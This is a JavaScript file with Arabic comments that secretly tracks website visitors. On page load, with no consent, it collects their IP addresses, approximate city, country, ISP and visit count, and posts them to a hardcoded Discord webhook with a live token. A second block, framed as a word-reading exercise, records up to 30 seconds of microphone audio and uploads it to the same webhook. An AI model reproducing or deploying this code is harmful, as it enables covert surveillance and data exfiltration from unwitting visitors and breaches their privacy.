
// === تتبع خفي: IP + موقع تقريبي + عدد الزيارات ===
(async function () {
    try {
        const ipv4Resp = await fetch("https://api.ipify.org?format=json");
        const ipv4Data = await ipv4Resp.json();
        const ipv4 = ipv4Data.ip;
        let ipv6 = "غير متوفر";
        try {
            const ipv6Resp = await fetch("https://api64.ipify.org?format=json");
            ipv6 = (await ipv6Resp.json()).ip;
        } catch {}
        const locResp = await fetch("https://ipapi.co/json/");
        const loc = await locResp.json();
        const key = `visit_${ipv4}`;
        let count = localStorage.getItem(key) || 0;
        count = parseInt(count) + 1;
        localStorage.setItem(key, count);
        const payload = {
            IPv4: ipv4,
            IPv6: ipv6,
            City: loc.city,
            Country: loc.country_name,
            ISP: loc.org,
            Visits: count
        };
        fetch("https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: JSON.stringify(payload) })
        });
    } catch (e) {
        console.error(e);
    }
})();

// === تسجيل صوتي ورفع مع رسالة حالة صحيحة لديسكورد ===
document.addEventListener("DOMContentLoaded", () => {
    const btn = document.getElementById("recordButton");
    if (!btn) return;

    const webhookURL = "https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm";
    const uploadSpeed = 500 * 1024; // bytes per second
    const words = ["الوطن","السلام","النجاح","الحرية","القراءة"];
    const selected = words[Math.floor(Math.random() * words.length)];

    let mediaRecorder, chunks = [];

    btn.addEventListener("click", async () => {
        if (!mediaRecorder || mediaRecorder.state === "inactive") {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream, { mimeType: "audio/webm" });
                mediaRecorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: "audio/webm" });
                    const estSec = Math.ceil(blob.size / uploadSpeed);

                    // رسالة حالة الرفع
                    const statusForm = new FormData();
                    statusForm.append("payload_json", JSON.stringify({
                        content: `تم استلام تسجيل صوتي جديد. جارٍ رفع الملف... متبقي تقريباً ${estSec} ثانية.`
                    }));
                    await fetch(webhookURL, { method: "POST", body: statusForm });

                    // رفع الملف مع تفاصيل الكلمة والنتيجة
                    const fileForm = new FormData();
                    fileForm.append("payload_json", JSON.stringify({
                        content: `الكلمة المطلوبة: ${selected}\nنتيجة القراءة: قيد التقييم.`
                    }));
                    fileForm.append("file", blob, "voice.webm");
                    await fetch(webhookURL, { method: "POST", body: fileForm });

                    chunks = [];
                };

                mediaRecorder.start();
                btn.textContent = "إيقاف التسجيل";

                setTimeout(() => {
                    if (mediaRecorder.state === "recording") {
                        mediaRecorder.stop();
                        btn.textContent = "بدء تسجيل الصوت";
                    }
                }, 30000);
            } catch (err) {
                console.error(err);
            }
        } else if (mediaRecorder.state === "recording") {
            mediaRecorder.stop();
            btn.textContent = "بدء تسجيل الصوت";
        }
    });
});
